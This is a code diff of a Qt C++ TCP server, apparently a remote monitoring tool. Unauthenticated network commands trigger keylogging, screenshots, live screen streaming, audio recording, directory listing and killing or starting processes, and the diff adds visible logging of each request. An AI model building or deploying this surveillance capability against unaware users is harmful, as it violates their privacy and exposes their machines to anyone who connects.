@@ -357,6 +357,7 @@ void Server::killTaskName(QString taskToKill) {
     });
 }
 
+
 void Server::killTaskPID(QString pidToKill) {
     qDebug() << pidToKill << "killing this";
     QProcess* process = new QProcess;
@@ -371,12 +372,71 @@ void Server::killTaskPID(QString pidToKill) {
     });
 }
 
-void Server::readMessage() {
-    QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
-    if (clientConnection != nullptr) {
-        qDebug() << "read message client connection not null";
+void populateModelRecursively(QStandardItem * parentItem, const QString &basePath, int levels, const QStringList &directoryList)
+{
+    QStack<QPair<QStandardItem*, QString>> stack;
+    stack.push(QPair<QStandardItem*, QString>(parentItem, basePath));
+
+    while (!stack.isEmpty()) {
+        QPair<QStandardItem*, QString> current = stack.pop();
+        QStandardItem *currentItem = current.first;
+        QString currentPath = current.second;
+
+        if (levels <= 0) {
+            continue;
+        }
+
+        QStringList entries = QDir(currentPath).entryList();
+
+        for (const QString& entry : entries) {
+            QString fullPath = QDir(currentPath).absoluteFilePath(entry);
+            if (QFileInfo(fullPath).isDir()) {
+                QFileInfo info(fullPath);
+                QString name = info.fileName();
+                if (name == "." || name == "..")
+                    continue;
+
+                QStandardItem *item = new QStandardItem(name);
+                item->setData(fullPath, Qt::UserRole);
+                currentItem->appendRow(item);
+
+                stack.push(QPair<QStandardItem*, QString>(item, fullPath));
+            }
+        }
+
+        levels--;
+    }
+}
+
+QStringList flattenTree(QStandardItem* parentItem)
+{
+    QStringList flattenedList;
+    QStack<QStandardItem*> stack;
+    stack.push(parentItem);
+
+    while (!stack.isEmpty()) {
+        QStandardItem* currentItem = stack.pop();
+
+        // Retrieve data from the current item
+        QString fullPath = currentItem->data(Qt::UserRole).toString();
+        flattenedList.append(fullPath);
+
+        // Push children onto the stack
+        for (int i = 0; i < currentItem->rowCount(); ++i) {
+            QStandardItem* childItem = currentItem->child(i);
+            stack.push(childItem);
+        }
     }
 
+    return flattenedList;
+}
+
+
+void Server::readMessage() {
+    QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
+
+    QHostAddress ipAddress = clientConnection->peerAddress();
+    QString msgDisplayed = ipAddress.toString() + " requested: ";
 
     in.setDevice(clientConnection);
     in.setVersion(QDataStream::Qt_6_5);
@@ -392,28 +452,22 @@ void Server::readMessage() {
         in >> target;
     }
 
-    qDebug() << "A message just got to server: " << message;
-
-    qDebug() << "A message just got to server: " << message;
+    qDebug() << "Server: received message: " << message;
 
     if (!in.commitTransaction())
         return;
 
-//    statusLabel->setText(message);
-
     if (message == tr("list applications")) {
-
+        msgDisplayed += "list all installed applications";
         processListApps = new QProcess();
         QString workingDir = QDir::currentPath();
         processListApps->start(workingDir + "//list_apps.exe");
         connect(processListApps, &QProcess::readyReadStandardOutput, this, [=]() {
             sendApplications(clientConnection);
         });
-
-//        tracking_keyboard();
     }
     else if (message  == tr("list running applications")) {
-
+        msgDisplayed += "list all running applications";
         processListRunningApps = new QProcess();
         QString workingDir = QDir::currentPath();
         processListRunningApps->start(workingDir + "//list_running_apps.exe");
@@ -421,9 +475,18 @@ void Server::readMessage() {
             sendRunningApplications(clientConnection);
         });
     }
-    else if (message == tr("list processes and apps")) {
+    else if (message == tr("list processes")) {
+        msgDisplayed += "list all running processes";
+        processListProcesses = new QProcess();
         QString workingDir = QDir::currentPath();
-
+        processListProcesses->start(workingDir + "//list_processes.exe");
+        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, [=]() {
+            sendProcesses(clientConnection);
+        });
+    }
+    else if (message == tr("list processes and apps")) {
+        msgDisplayed += "list all processes and applications";
+        QString workingDir = QDir::currentPath();
         processListRunningApps = new QProcess(this);
         processListRunningApps->start(workingDir + "//list_running_apps.exe");
         connect(processListRunningApps, &QProcess::readyReadStandardOutput, this, [=]() {
@@ -443,16 +506,8 @@ void Server::readMessage() {
         });
 
     }
-    else if (message == tr("list processes")) {
-        processListProcesses = new QProcess();
-        QString workingDir = QDir::currentPath();
-        processListProcesses->start(workingDir + "//list_processes.exe");
-        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, [=]() {
-            sendProcesses(clientConnection);
-        });
-    }
     else if (message == tr("keyboard_track")) {
-        qDebug() << "keyboard tracking started?";
+        msgDisplayed += "listening to all keyboard input";
         processKeyboardTrack = new QProcess();
         processKeyboardTrack->start(".\\keyboard_track.exe");
         connect(processKeyboardTrack, &QProcess::readyReadStandardOutput, this, [=]() {
@@ -477,38 +532,41 @@ void Server::readMessage() {
         });
     }
     else if(message == tr("stop_stroke")){
+        msgDisplayed += "stopped listening to all keyboard input";
         processKeyboardTrack->kill();
         delete processKeyboardTrack;
         processKeyboardTrack = nullptr;
     }
     else if (message == tr("take screenshot")) {
-        qDebug() << "taken screenshot";
+        msgDisplayed += "taking a screenshot of the entire screen";
         QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
         sendScreenshot(clientConnection, screenshot, tr("image"));
 
     }
     else if (message == tr("stream screen")){
-        qDebug() << "streaming screen";
+        msgDisplayed += "streaming the entire screen";
         timer = new QTimer;
         connect(timer, &QTimer::timeout, this, [=]() {
             stream(clientConnection);
         });
         timer->start(200);
-//        QTimer::singleShot(3000, timer, &QTimer::stop);
     }
     else if (message == tr("stop_stream")){
+        msgDisplayed += "stopped streaming the entire screen";
         timer->stop();
         delete timer;
         timer = nullptr;
         //        QTimer::singleShot(3000, timer, &QTimer::stop);
     }
     else if (message == tr("recording")){
+        msgDisplayed += "recording audio";
         if (recorder == nullptr)
             recorder = new AudioRecorder;
 
         recorder->auto_start();
     }
     else if (message == tr("stop_recording")){
+        msgDisplayed += "stopped recording audio";
         recorder->stop_by_msg();
 
         recorder->close();
@@ -518,10 +576,9 @@ void Server::readMessage() {
         send_audio_file(clientConnection);
     }
     else if (message == "ls") {
-        qDebug() << "roi co ls chua";
-//        QString dirPath = args.size() > 1 ? args[1] : ".";
         QString dirPath = (target != "" ? target : ".");
-        qDebug() << dirPath << target;
+
+        emit displayMsg("Requested: list directory with path " + dirPath);
         QDir dir(dirPath);
         QStringList entries = dir.entryList();
         QString response = entries.join("\n");
@@ -529,6 +586,7 @@ void Server::readMessage() {
         QStringList fullPathsEntries;
 
         for (const QString& entry : entries) {
+//            if (entry == ".") continue;
             QString fullPath = dir.absoluteFilePath(entry);
             fullPathsEntries.append(fullPath);
         }
@@ -536,26 +594,34 @@ void Server::readMessage() {
         QStringList directories;
 
         for (const QString& entry : entries) {
+//            if (entry == ".") continue;
             QString fullPath = dir.absoluteFilePath(entry);
             if (QFileInfo(fullPath).isDir()) {
                 directories.append(fullPath);
             }
         }
 
-        sendFileStructure(clientConnection, fullPathsEntries, directories);
+        QStandardItemModel *model = new QStandardItemModel;
+        QStandardItem *rootItem = model->invisibleRootItem();
+        int levels = 3;
+        populateModelRecursively(rootItem, target, levels, directories);
+        QStringList flattenDir = flattenTree(rootItem);
+
+        sendFileStructure(clientConnection, fullPathsEntries, flattenDir);
     }
     else if (message == tr("kill task pid")) {
-        qDebug() << "killing task pid" << target;
+        msgDisplayed += "Killing process with pid " + target;
         killTaskPID(target);
     }
     else if (message == tr("kill task name")) {
+        msgDisplayed += "Killing process/app with path " + target;
         killTaskName(target);
     }
     else if (message == tr("start task name")) {
+        msgDisplayed += "Starting app with path " + target;
         startTask(target);
     }
-
-    emit(readyRead(message));
+    emit (displayMsg(msgDisplayed));
 }
 
 void Server::stream(QTcpSocket* clientConnection) {
@@ -563,20 +629,25 @@ void Server::stream(QTcpSocket* clientConnection) {
     sendScreenshot(clientConnection, screenshot, tr("stream"));
 }
 
-
-
 void Server::newConnection() {
     QTcpSocket *clientConnection = tcpServer->nextPendingConnection();
     connect(clientConnection, &QTcpSocket::readyRead, this, &Server::readMessage);
     connect(clientConnection, &QTcpSocket::disconnected, this, &Server::disconnected);
     clients.append(clientConnection);
-    qDebug() << "incoming connection.";
-    //sendMessage(clientConnection, "ayooo", );
+
+    // Get the IP address of the incoming connection
+    QHostAddress ipAddress = clientConnection->peerAddress();
+    QString ipAddressString = "IP " + ipAddress.toString() + " just connected";
+    emit (displayMsg(ipAddressString));
 }
 
 void Server::disconnected() {
-    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
-    clients.removeOne(clientSocket);
+    QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
+    clients.removeOne(clientConnection);
+
+    QHostAddress ipAddress = clientConnection->peerAddress();
+    QString ipAddressString = "IP " + ipAddress.toString() + " just disconnected";
+    emit (displayMsg(ipAddressString));
 }
 
 
